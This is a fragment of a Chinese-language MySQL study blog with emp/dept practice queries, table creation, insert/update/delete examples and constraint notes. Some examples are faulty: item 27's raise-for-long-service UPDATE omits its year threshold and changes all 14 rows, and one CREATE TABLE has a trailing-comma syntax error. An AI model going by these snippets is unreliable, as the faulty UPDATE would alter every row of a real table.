<pre><code>select a.ename,a.empno,d.dname from emp a join emp b on a.mgr = b.empno join dept d on a.deptno = d.deptno where a.hiredate&lt;b.hiredate;</code></pre><p>+——-+——-+————+<br>| ename | empno | dname      |<br>+——-+——-+————+<br>| SMITH |  7369 | RESEARCH   |<br>| ALLEN |  7499 | SALES      |<br>| WARD  |  7521 | SALES      |<br>| JONES |  7566 | RESEARCH   |<br>| BLAKE |  7698 | SALES      |<br>| CLARK |  7782 | ACCOUNTING |<br>+——-+——-+————+</p>
<h1 id="16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门"><a href="#16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门" class="headerlink" title="16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门"></a>16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门</h1><pre><code>select d.dname, e.* from emp e right join dept d on e.deptno = d.deptno;</code></pre><p>+————+——-+——–+———–+——+————+———+———+——–+<br>| dname      | EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+————+——-+——–+———–+——+————+———+———+——–+<br>| RESEARCH   |  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>| SALES      |  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>| SALES      |  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>| RESEARCH   |  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>| SALES      |  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>| SALES      |  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>| ACCOUNTING |  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>| RESEARCH   |  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>| ACCOUNTING |  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>| SALES      |  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>| RESEARCH   |  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>| SALES      |  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>| RESEARCH   |  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>| ACCOUNTING |  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>| OPERATIONS |  NULL | NULL   | NULL      | NULL | NULL       |    NULL |    NULL |   NULL |<br>+————+——-+——–+———–+——+————+———+———+——–+</p>
<h1 id="17、列出至少有5给员工的所有部门"><a href="#17、列出至少有5给员工的所有部门" class="headerlink" title="17、列出至少有5给员工的所有部门"></a>17、列出至少有5给员工的所有部门</h1><pre><code>mysql&gt; select count(*),d.dname from emp e join dept d on e.deptno = d.deptno group by d.dname having count(*)&gt;=5;</code></pre><p>+———-+———-+<br>| count(*) | dname    |<br>+———-+———-+<br>|        5 | RESEARCH |<br>|        6 | SALES    |<br>+———-+———-+</p>
<h1 id="18、列出薪金比“SMITH”多的所有员工信息"><a href="#18、列出薪金比“SMITH”多的所有员工信息" class="headerlink" title="18、列出薪金比“SMITH”多的所有员工信息"></a>18、列出薪金比“SMITH”多的所有员工信息</h1><pre><code>select * from emp where sal&gt;(select sal from emp where ename=&apos;smith&apos;);</code></pre><p>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
<h1 id="19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。"><a href="#19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。" class="headerlink" title="19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。"></a>19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。</h1><p><em>第一步，列出所有“CLERK”的人员</em></p>
<pre><code>select e.ename,e.job,d.dname from emp e join dept d on d.deptno = e.deptno where e.job=&apos;CLERK&apos;;</code></pre><p>+——–+——-+————+<br>| ename  | job   | dname      |<br>+——–+——-+————+<br>| SMITH  | CLERK | RESEARCH   |<br>| ADAMS  | CLERK | RESEARCH   |<br>| JAMES  | CLERK | SALES      |<br>| MILLER | CLERK | ACCOUNTING |<br>+——–+——-+————+</p>
<p><em>第二步，找出每个部门的部门人数作为t2表，上表作为t1表进行内连接</em></p>
<pre><code>select count(*), d.dname from emp e join dept d on e.deptno = d.deptno group by d.dname;</code></pre><p>+———-+————+<br>| count(*) | dname      |<br>+———-+————+<br>|        3 | ACCOUNTING |<br>|        5 | RESEARCH   |<br>|        6 | SALES      |<br>+———-+————+</p>
<p><em>第三步，自连接t1和t2表</em></p>
<pre><code>select t1.ename,t1.dname,t2.count from (select e.ename,e.job,d.dname from emp e join dept d on d.deptno = e.deptno where e.job=&apos;CLERK&apos;) t1 join (select count(*) count, d.dname from emp e join dept d on e.deptno = d.deptno group by d.dname) t2 on t1.dname = t2.dname;</code></pre><p>+——–+————+——-+<br>| ename  | dname      | count |<br>+——–+————+——-+<br>| SMITH  | RESEARCH   |     5 |<br>| ADAMS  | RESEARCH   |     5 |<br>| JAMES  | SALES      |     6 |<br>| MILLER | ACCOUNTING |     3 |<br>+——–+————+——-+</p>
<h1 id="20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。"><a href="#20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。" class="headerlink" title="20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。"></a>20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。</h1><p><em>按照工作岗位分组求最小值。</em></p>
<pre><code>select job, count(*) from emp group by job having min(sal)&gt;1500;</code></pre><p>+———–+———-+<br>| job       | count(*) |<br>+———–+———-+<br>| ANALYST   |        2 |<br>| MANAGER   |        3 |<br>| PRESIDENT |        1 |<br>+———–+———-+</p>
<h1 id="21、列出在部门“SALES”-销售部-工作的员工的姓名，假定不知道销售部的部门编号。"><a href="#21、列出在部门“SALES”-销售部-工作的员工的姓名，假定不知道销售部的部门编号。" class="headerlink" title="21、列出在部门“SALES”(销售部)工作的员工的姓名，假定不知道销售部的部门编号。"></a>21、列出在部门“SALES”(销售部)工作的员工的姓名，假定不知道销售部的部门编号。</h1><pre><code>select deptno from dept where dname=&apos;SALES&apos;;</code></pre><p>+——–+<br>| deptno |<br>+——–+<br>|     30 |<br>+——–+<br>        select ename from emp where deptno =(select deptno from dept where dname=’SALES’);<br>+——–+<br>| ename  |<br>+——–+<br>| ALLEN  |<br>| WARD   |<br>| MARTIN |<br>| BLAKE  |<br>| TURNER |<br>| JAMES  |<br>+——–+</p>
<h1 id="22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。"><a href="#22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。" class="headerlink" title="22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。"></a>22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。</h1><p><em>第一步，列出薪金高于公司平均薪资的所有员工</em></p>
<pre><code>select e.* from emp e where sal&gt;(select avg(sal) avgsal from emp);</code></pre><p>+——-+——-+———–+——+————+———+——+——–+<br>| EMPNO | ENAME | JOB       | MGR  | HIREDATE   | SAL     | COMM | DEPTNO |<br>+——-+——-+———–+——+————+———+——+——–+<br>|  7566 | JONES | MANAGER   | 7839 | 1981-04-02 | 2975.00 | NULL |     20 |<br>|  7698 | BLAKE | MANAGER   | 7839 | 1981-05-01 | 2850.00 | NULL |     30 |<br>|  7782 | CLARK | MANAGER   | 7839 | 1981-06-09 | 2450.00 | NULL |     10 |<br>|  7788 | SCOTT | ANALYST   | 7566 | 1987-04-19 | 3000.00 | NULL |     20 |<br>|  7839 | KING  | PRESIDENT | NULL | 1981-11-17 | 5000.00 | NULL |     10 |<br>|  7902 | FORD  | ANALYST   | 7566 | 1981-12-03 | 3000.00 | NULL |     20 |<br>+——-+——-+———–+——+————+———+——+——–+</p>
<p><em>第二步，列出所在部门，上级领导，薪资等级</em></p>
<pre><code>select d.dname 部门,t2.ename 上级领导, t1.ename 员工姓名,s.grade from (select e.* from emp e where sal&gt;(select avg(sal) avgsal from emp)) t1 left join dept d on t1.deptno = d.deptno left join (select e.* from emp e where sal&gt;(select avg(sal) avgsal from emp)) t2 on t1.mgr=t2.empno left join salgrade s on t1.sal between losal and hisal;</code></pre><p>+————+———-+———-+——-+<br>| 部门       | 上级领导 | 员工姓名 | grade |<br>+————+———-+———-+——-+<br>| ACCOUNTING | KING     | CLARK    |     4 |<br>| RESEARCH   | KING     | JONES    |     4 |<br>| RESEARCH   | JONES    | SCOTT    |     4 |<br>| RESEARCH   | JONES    | FORD     |     4 |<br>| SALES      | KING     | BLAKE    |     4 |<br>| ACCOUNTING | NULL     | KING     |     5 |<br>+————+———-+———-+——-+</p>
<h1 id="23、列出各个部门的MANAGER（领导）最低薪金"><a href="#23、列出各个部门的MANAGER（领导）最低薪金" class="headerlink" title="23、列出各个部门的MANAGER（领导）最低薪金"></a>23、列出各个部门的MANAGER（领导）最低薪金</h1><pre><code>select min(sal),deptno from emp where job=&apos;MANAGER&apos; group by deptno;</code></pre><p>+———-+——–+<br>| min(sal) | deptno |<br>+———-+——–+<br>|  2450.00 |     10 |<br>|  2975.00 |     20 |<br>|  2850.00 |     30 |<br>+———-+——–+</p>
<h1 id="24、列出所有员工的年工资，按年薪从低到高排序"><a href="#24、列出所有员工的年工资，按年薪从低到高排序" class="headerlink" title="24、列出所有员工的年工资，按年薪从低到高排序"></a>24、列出所有员工的年工资，按年薪从低到高排序</h1><pre><code>select ename, (sal+ifnull(comm,0))*12 yearsal from emp order by yearsal;</code></pre><p>+——–+———-+<br>| ename  | yearsal  |<br>+——–+———-+<br>| SMITH  |  9600.00 |<br>| JAMES  | 11400.00 |<br>| ADAMS  | 13200.00 |<br>| MILLER | 15600.00 |<br>| TURNER | 18000.00 |<br>| WARD   | 21000.00 |<br>| ALLEN  | 22800.00 |<br>| CLARK  | 29400.00 |<br>| MARTIN | 31800.00 |<br>| BLAKE  | 34200.00 |<br>| JONES  | 35700.00 |<br>| SCOTT  | 36000.00 |<br>| FORD   | 36000.00 |<br>| KING   | 60000.00 |<br>+——–+———-+</p>
<h1 id="25、求出员工领导的薪水超过3000的员工名称与领导名称"><a href="#25、求出员工领导的薪水超过3000的员工名称与领导名称" class="headerlink" title="25、求出员工领导的薪水超过3000的员工名称与领导名称"></a>25、求出员工领导的薪水超过3000的员工名称与领导名称</h1><pre><code>select a.ename, b.ename from emp a join emp b on a.mgr = b.empno where b.sal&gt;3000;</code></pre><p>+——-+——-+<br>| ename | ename |<br>+——-+——-+<br>| JONES | KING  |<br>| BLAKE | KING  |<br>| CLARK | KING  |<br>+——-+——-+</p>
<h1 id="26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数"><a href="#26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数" class="headerlink" title="26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数"></a>26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数</h1><pre><code>select d.dname, ifnull(sum(e.sal),&apos; &apos;),count(e.ename) from emp e right join (select * from dept where dname like &apos;%s%&apos;) d on e.deptno = d.deptno group by d.dname;</code></pre><p>+————+————————+—————-+<br>| DNAME      | ifnull(sum(e.sal),’ ‘) | count(e.ename) |<br>+————+————————+—————-+<br>| OPERATIONS |                        |              0 |<br>| RESEARCH   | 10875.00               |              5 |<br>| SALES      | 9400.00                |              6 |<br>+————+————————+—————-+</p>
<h1 id="27、给任职日期超过30年的员工加薪10"><a href="#27、给任职日期超过30年的员工加薪10" class="headerlink" title="27、给任职日期超过30年的员工加薪10%"></a>27、给任职日期超过30年的员工加薪10%</h1><pre><code>update emp set sal = sal * 1.1 where timestampdiff(year,hiredate,now());</code></pre><p>Query OK, 14 rows affected (0.02 sec)<br>Rows matched: 14  Changed: 14  Warnings: 0</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL表的使用</title>
    <url>/2020/10/12/MYSQL%E8%A1%A8%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h1><blockquote>
<p>建表句的语法根式：<br><strong>create table 表名(字段名1 数据类型, 字段明2 数据类型, 字段名3 数据类型, …);</strong></p>
</blockquote>
<blockquote>
<p>关于MYSQL当中字段的数据类型？<br>常见：<br><strong>int（整数型）（java中的int）</strong><br><strong>bigint（长整型）（java中的long）</strong><br><strong>float（浮点型）（java中的float double）</strong><br><strong>char（定长长字符串）（string）</strong><br><strong>varchar（可变长字符串最多255个）（StringBuffer、StringBuilder）</strong><br><strong>date（日期类型）（对应java中的java.sql.date类型）</strong><br><strong>BLOB（Binary Large OBject 二进制大对象，如存储图片、视频等流媒体信息）（对应java中的object）</strong><br><strong>CLOB（Character Large OBject 存储较大文本，比如，可以存储4G的字符串。）（对应java中的object）</strong></p>
</blockquote>
<p><strong>char和varchar怎么选择</strong></p>
<p>　　<strong>在实际的开发中，当某个字段中的数据长度不发生改变的时候，是定长的，例如：性别、生日等都采用char。</strong></p>
<p>　　<strong>当一个字段的数据长度不确定，例如：简介、姓名等都是采用varchar。</strong></p>
<blockquote>
<p><strong>BLOB和CLOB类型的使用？</strong><br>　　<strong>电影表：t_movie</strong><br>　　<strong>id(int) 　　name(varchar)　　playtime(date/char)　　poster(BLOB)　　history(CLOB)</strong></p>
<p>————————————————————————————————————————————<br>　　1　　　<br>　　2<br>　　3</p>
</blockquote>
<p>表名在数据库当中一般建议以： t＿或者tbl＿开始</p>
<p>创建学生表：<br>　　学生信息包括：<br>　　　　学号、姓名、性别、班级编号、生日<br>　　　　学号：bigint<br>　　　　姓名：varchar<br>　　　　性别：char<br>　　　　班级编号：int<br>　　　　生日：char</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">create table t_student(</span><br><span class="line">	no bigint,</span><br><span class="line">	name varchar(255),</span><br><span class="line">	sex char(1),</span><br><span class="line">	classno varchar(255),</span><br><span class="line">	birth char(10)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h1 id="insert语句查询数据"><a href="#insert语句查询数据" class="headerlink" title="insert语句查询数据"></a>insert语句查询数据</h1><p>  <strong>语法格式：</strong><br>    <strong>insert into 表名(字段名1,字段名2,……) values(值1,……)</strong><br>    要求：<strong>字段的数量和值的数量相同，并且数据类型要对应相同。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">insert into t_student(no,name,sex,classno,birth) values(&#39;2&#39;,&#39;lisi&#39;,&#39;1&#39;,&#39;高三&#39;,&#39;2001-12-29&#39;);</span><br><span class="line">mysql&gt; select * from t_student;</span><br></pre></td></tr></table></figure></div>

<p>+——+———-+——+———+————+<br>| no   | name     | sex  | classno | birth      |<br>+——+———-+——+———+————+<br>|    1 | zhangsan | 1    | 高三    | 2001-12-29 |<br>+——+———-+——+———+————+<br>1 row in set (0.00 sec)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">insert into t_student(name) values(&#39;wangwu&#39;);&#x2F;&#x2F;除name字段之外，剩下的所有字段自动插入NULL。</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from t_student;</span><br></pre></td></tr></table></figure></div>
<p>+——+———-+——+———+————+<br>| no   | name     | sex  | classno | birth      |<br>+——+———-+——+———+————+<br>|    1 | zhangsan | 1    | 高三    | 2001-12-29 |<br>|    2 | lisi     | 1    | 高三    | 2001-12-29 |<br>| NULL | wangwu   | NULL | NULL    | NULL       |<br>+——+———-+——+———+————+</p>
<pre><code>insert into t_student(no) values(&apos;3&apos;);</code></pre><p>mysql&gt; insert into t_student(no) values(‘3’);<br>Query OK, 1 row affected (0.01 sec)</p>
<p>mysql&gt; select * from t_student;<br>+——+———-+——+———+————+<br>| no   | name     | sex  | classno | birth      |<br>+——+———-+——+———+————+<br>|    1 | zhangsan | 1    | 高三    | 2001-12-29 |<br>|    2 | lisi     | 1    | 高三    | 2001-12-29 |<br>| NULL | wangwu   | NULL | NULL    | NULL       |<br>|    3 | NULL     | NULL | NULL    | NULL       |<br>+——+———-+——+———+————+<br>4 rows in set (0.00 sec)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">drop table if exists t_student;</span><br><span class="line">create table t_student(</span><br><span class="line">	no bigint,</span><br><span class="line">	name varchar(255),</span><br><span class="line">	sex char(1) default 1,</span><br><span class="line">	classno varchar(255),</span><br><span class="line">	birth char(10)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<pre><code>insert into t_student(name) values(&apos;zhang&apos;);

mysql&gt; insert into t_student(name) values(&apos;zhang&apos;);</code></pre><p>mysql&gt; select * from t_student;<br>+——+——-+——+———+——-+<br>| no   | name  | sex  | classno | birth |<br>+——+——-+——+———+——-+<br>| NULL | zhang | 1    | NULL    | NULL  |<br>+——+——-+——+———+——-+<br>1 row in set (0.00 sec)</p>
<p><strong>需要注意的地方：</strong><br>　　当一条insert语句执行成功之后，表格当中必然会多一行记录。<br>　　即使多的这一行记录当中某些字段是NULL，后期也没有办法在执行insert语句插入数据了<br>　　只能使用update进行更新。</p>
<pre><code>insert into t_student values(1,&apos;jack&apos;,&apos;0&apos;,&apos;gaosan&apos;,&apos;1986-10-23&apos;);

mysql&gt; insert into t_student values(1,&apos;jack&apos;,&apos;0&apos;,&apos;gaosan&apos;,&apos;1986-10-23&apos;);</code></pre><p>Query OK, 1 row affected (0.00 sec)<br>//字段可以省略不写，但是后面的value对数量和顺序都有要求。<br>mysql&gt; select * from t_student;<br>+——+——-+——+———+————+<br>| no   | name  | sex  | classno | birth      |<br>+——+——-+——+———+————+<br>| NULL | zhang | 1    | NULL    | NULL       |<br>|    1 | jack  | 0    | gaosan  | 1986-10-23 |<br>+——+——-+——+———+————+</p>
<pre><code>//一次插入多行数据
insert into t_student
    (no,name,sex,classno,birth) 
values
    (3,&apos;rose&apos;,&apos;1&apos;,&apos;gaosi2&apos;,&apos;2002-02-10&apos;),
    (4,&apos;se&apos;,&apos;0&apos;,&apos;gaosi2&apos;,&apos;2202-02-10&apos;);

mysql&gt; select * from t_student;</code></pre><p>+——+——-+——+———+————+<br>| no   | name  | sex  | classno | birth      |<br>+——+——-+——+———+————+<br>| NULL | zhang | 1    | NULL    | NULL       |<br>|    1 | jack  | 0    | gaosan  | 1986-10-23 |<br>|    3 | rose  | 1    | gaosi2  | 2002-02-10 |<br>|    4 | se    | 0    | gaosi2  | 2202-02-10 |<br>+——+——-+——+———+————+</p>
<h1 id="表的复制"><a href="#表的复制" class="headerlink" title="表的复制"></a>表的复制</h1><pre><code>mysql&gt; create table emp1 as select * from emp;</code></pre><p>Query OK, 14 rows affected (0.05 sec)<br>Records: 14  Duplicates: 0  Warnings: 0</p>
<p>语法：<br>    create table 表名 as select语句;<br>    将查询结果当做表创建出来</p>
<h1 id="将查询结果插入到一张表中"><a href="#将查询结果插入到一张表中" class="headerlink" title="将查询结果插入到一张表中"></a>将查询结果插入到一张表中</h1><pre><code>mysql&gt; insert into dept1 select * from dept;
mysql&gt; select * from dept1;</code></pre><p>+——–+————+———-+<br>| DEPTNO | DNAME      | LOC      |<br>+——–+————+———-+<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>+——–+————+———-+<br>8 rows in set (0.00 sec)</p>
<h1 id="修改数据：update"><a href="#修改数据：update" class="headerlink" title="修改数据：update"></a>修改数据：update</h1><p>  语法格式：<br>      update 表名 set 字段名1=值1,字段名2=值2…… where 条件;</p>
<p>注意：没有条件整张表数据全部更新</p>
<p><strong>案例：将部门10的loc修改为shanghai，将部门名称修改为人事部</strong></p>
<pre><code>update dept1 set loc=&apos;shanghai&apos;, dname=&apos;renshibu&apos; where deptno=10;
mysql&gt; update dept1 set loc=&apos;shanghai&apos;, dname=&apos;renshibu&apos; where deptno=10;</code></pre><p>Query OK, 2 rows affected (0.01 sec)<br>Rows matched: 2  Changed: 2  Warnings: 0</p>
<p>mysql&gt; select * from dept1;<br>+——–+————+———-+<br>| DEPTNO | DNAME      | LOC      |<br>+——–+————+———-+<br>|     10 | renshibu   | shanghai |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>|     10 | renshibu   | shanghai |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>+——–+————+———-+<br>8 rows in set (0.00 sec)</p>
<pre><code>更新所有记录
    update dept1 set loc=&apos;x&apos;, dname=&apos;y&apos;;
    mysql&gt; select * from dept1;</code></pre><p>+——–+——-+——+<br>| DEPTNO | DNAME | LOC  |<br>+——–+——-+——+<br>|     10 | y     | x    |<br>|     20 | y     | x    |<br>|     30 | y     | x    |<br>|     40 | y     | x    |<br>|     10 | y     | x    |<br>|     20 | y     | x    |<br>|     30 | y     | x    |<br>|     40 | y     | x    |<br>+——–+——-+——+</p>
<h1 id="删除数据？"><a href="#删除数据？" class="headerlink" title="删除数据？"></a>删除数据？</h1><p>  语法格式：</p>
<pre><code>delete from 表名 where 条件;</code></pre><p><strong>注意：没有条件全部删除</strong></p>
<p>删除10部门数据？</p>
<pre><code>**delete from dept1 where deptno = 10;**</code></pre><p>删除所有记录？</p>
<pre><code>**delete from dept1;**</code></pre><p>怎么删除大表中的数据？（重点）</p>
<pre><code>truncate table 表名; //表被截断，不可回滚。永久丢失</code></pre><p>删除表？</p>
<pre><code>drop table 表名;//这个通用。
drop table if exists 表名;//oracle不支持这种写法</code></pre><h1 id="对于表结构的修改"><a href="#对于表结构的修改" class="headerlink" title="对于表结构的修改"></a>对于表结构的修改</h1><p>设计好了之后，对表结构的修改是很少的<br>需要修改表结构，我们也可以直接使用工具操作。<br>出现在java代码当中的sql包括：insert delete update select(这些都是表中的数据操作)</p>
<p>增删改查有一个术语： CRUD操作<br>create(增) retrieve（检索） update（改） delete（删除）</p>
<h1 id="约束（constraint）"><a href="#约束（constraint）" class="headerlink" title="约束（constraint）"></a>约束（constraint）</h1><h2 id="什么时约束？常见的约束有哪些呢？"><a href="#什么时约束？常见的约束有哪些呢？" class="headerlink" title="什么时约束？常见的约束有哪些呢？"></a>什么时约束？常见的约束有哪些呢？</h2><pre><code>在创建表的时候，可以给表的字段添加相应的约束，添加约束的目的是为了保证表中数据的
**合法性、有效性、完整性**
常见的约束有哪些？
  非空约束(not null)：约束的字段不能为NULL。
  唯一约束(unique)：约束的字段不能重复
  主键约束(primary key)：约束的字段既不能为NULL，也不能重复（简称PK）
  外键约束(foreign key)：……（简称FK）
  检查约束(check):注意Oracle数据库有check约束，但是mysql没有，目前mysql不支持该约束。</code></pre><h2 id="非空约束-not-null"><a href="#非空约束-not-null" class="headerlink" title="非空约束 not null"></a>非空约束 not null</h2><pre><code>drop table if exists t_user;
create table t_user(
   id int,
   username varchar(255) not null,
   password varchar(255)
 );

insert into t_user(id,password) values(1,&apos;123&apos;);</code></pre><h2 id="唯一性约束（unique）"><a href="#唯一性约束（unique）" class="headerlink" title="唯一性约束（unique）"></a>唯一性约束（unique）</h2><p>  <strong>唯一约束修饰的字段具有唯一性，不能重复。但可以为NULL。</strong><br>  案例：给某一列添加unique</p>
<pre><code>drop table if exists t_user;
create table t_user(
id int,
username varchar(255) unique  //列级约束
);
insert into t_user values(1,&apos;zhangsan&apos;);
insert into t_user(id) values(2);
insert into t_user(id) values(3);
insert into t_user(id) values(4);</code></pre><p>  案例：给两个列或者多个列添加unique</p>
<pre><code>drop table if exists t_user;
create table t_user(
  id int,
  usercode varchar(255),
  username varchar(255),
  unique(usercode,username) //联合添加一个约束 【表级约束】
);
insert into t_user values(1,&apos;111&apos;,&apos;zs&apos;);
insert into t_user values(2,&apos;111&apos;,&apos;ls&apos;);
insert into t_user values(3,&apos;222&apos;,&apos;zs&apos;);
select * from t_user;

drop table if exists t_user;//两个唯一约束
create table t_user(
  id int,
  usercode varchar(255) unique,
  username varchar(255) unique,
);</code></pre><p><strong>注意：not null只有列级约束，没有表级约束</strong></p>
<h2 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h2><p>   怎么给一张表添加主键约束呢？</p>
<pre><code>   drop table if exists t_user;
create table t_user(
  id int primary key,
  username varchar(255),
  email varchar(255)
 );
 insert into t_user(id,username,email) values(1,&apos;lis&apos;,&apos;lis@123.com&apos;);
 insert into t_user(id,username,email) values(2,&apos;zs&apos;,&apos;zs@123.com&apos;);
 insert into t_user(id,username,email) values(3,&apos;ww&apos;,&apos;ww@123.com&apos;);
 select * from t_user;</code></pre><p>+—-+———-+————-+<br>| id | username | email       |<br>+—-+———-+————-+<br>|  1 | lis      | <a href="mailto:lis@123.com">lis@123.com</a> |<br>|  2 | zs       | <a href="mailto:zs@123.com">zs@123.com</a>  |<br>|  3 | ww       | <a href="mailto:ww@123.com">ww@123.com</a>  |<br>+—-+———-+————-+</p>
<p>mysql&gt; desc t_user;<br>+———-+————–+——+—–+———+——-+<br>| Field    | Type         | Null | Key | Default | Extra |<br>+———-+————–+——+—–+———+——-+<br>| id       | int(11)      | NO   | PRI | NULL    |       |<br>| username | varchar(255) | YES  |     | NULL    |       |<br>| email    | varchar(255) | YES  |     | NULL    |       |<br>+———-+————–+——+—–+———+——-+</p>
<p><strong>·  根据以上的测试得出，id是主键，因为添加了主键约束，主键字段中的数据不能为NULL，也不能重复。</strong><br><strong>·  主键的特点：不能为NULL，也不能重复</strong></p>
<p><strong>· 主键相关的术语</strong></p>
<pre><code>主键约束：primary key
主键字段：id字段添加primary key之后，id称为
主键值：id字段中的每一个值都是主键值</code></pre><p><strong>主键有什么作用</strong><br>　表的设计三范式中有要求，第一范式就要求任何一张表都应该有主键<br>　主键的作用：主键值是这行记录在这张表当中的唯一标识（就像一个人的身份证号一样。）</p>
<p><em>主键的分类？</em><br>　根据主键字段的字段数量来划分：<br>    单一主键（推荐，常用的）<br>    复合主键（多个字段联合起来添加一个主键约束）（复合主键不建议使用，因为复合主键违背三范式）<br>　根据主键性质来划分<br>    自然主键：主键值最好就是一个和业务没有任何关系的自然数（这种方式是推荐的）<br>    业务主键：主键值和系统的业务挂钩，例如：拿着银行卡的卡号做主键，拿着身份证号码作为主键（不推荐用）<br>    <em>最好不要拿着和业务挂钩的字段作为主键。因为以后业务一旦发生改变的时候，主键值可能也需要随着发生变化，但有的时候后没有办法变化，因为变化可能会导致主键值重复。</em></p>
<p><strong>一张表的主键约束只能有一个。（重点）</strong></p>
<p><em>使用表级约束定义主键</em></p>
<pre><code>drop table if exists t_user;
create table t_user(
  id int,
  username varchar(255),
  primary key(id)
 );
 insert into t_user(id,username) values(1,&apos;cs&apos;);
